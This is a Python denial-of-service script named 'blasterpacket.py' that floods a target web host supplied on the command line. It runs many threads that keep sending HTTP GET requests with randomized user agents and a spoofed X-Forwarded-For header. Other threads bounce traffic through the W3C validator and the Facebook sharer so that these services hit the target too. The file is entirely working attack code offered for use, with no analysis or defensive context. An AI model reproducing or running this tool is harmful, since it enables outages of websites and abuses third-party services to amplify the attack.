from queue import Queue
from fake_useragent import UserAgent
import urllib.request
import socket
import threading
import random
import time
import sys

host = sys.argv[1]
port = 80
thr = int(sys.argv[2])
proxy_ip = '10.181.12.14'

def user_agent_list():
    return [
            UserAgent().chrome for i in range(100)
            ]

def bot_links():                                                                                                                                                   return [
            "http://validator.w3.org/check?uri=",
            "http://www.facebook.com/sharer/sharer.php?u="
            ]

def bot_rippering(url, user_agent):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(user_agent)}))
            print("bot is rippering...")
            time.sleep(1)
    except Exception as error:
        print(error)
        time.sleep(1)

def down_it(item, host, port, user_agent):
    try:
        while True:
            packet = str("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Forwarded-For: " + proxy_ip + "\r\nUser-Agent: " + random.choice(user_agent) + "\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n").encode('ascii')
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((host,int(port)))
            if conn.send(packet):
                conn.shutdown(1)
                print("[%s] <-- packet sent rippering -->" % time.ctime(time.time()))
            else:
                conn.shutdown(1)
                print("Shut down")
    except socket.error as error:
        print(error)

def dos(q, host, port, user_agent):
    while True:
        item = q.get()
        down_it(item, host, port, user_agent)
        q.task_done()

def dos2(w, host, user_agent):
    while True:
        item = w.get()
        bot_rippering(random.choice(bot) + "http://" + host, user_agent)
        w.task_done()

if __name__ == "__main__":
    bot = bot_links()
    user_agent = user_agent_list()
    if len(sys.argv) != 3:
        print("Usage: python blasterpacket.py <example.com> <500 or 100>")
        sys.exit(1)
    try:
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn.connect((host, port))
        conn.settimeout(1)
    except socket.error as error:
        print(error)
    q: int = Queue()
    w: int = Queue()
    while True:
        for i in range(int(thr)):
            threading.Thread(target=dos, args=(q, host, port, user_agent), daemon=True).start()
            threading.Thread(target=dos2, args=(w, host, user_agent), daemon=True).start()
        item = 0
        while True:
            if item > 1800:
                item = 0
            q.put(item)
            w.put(item)
            item += 1
            q.join()
            w.join()
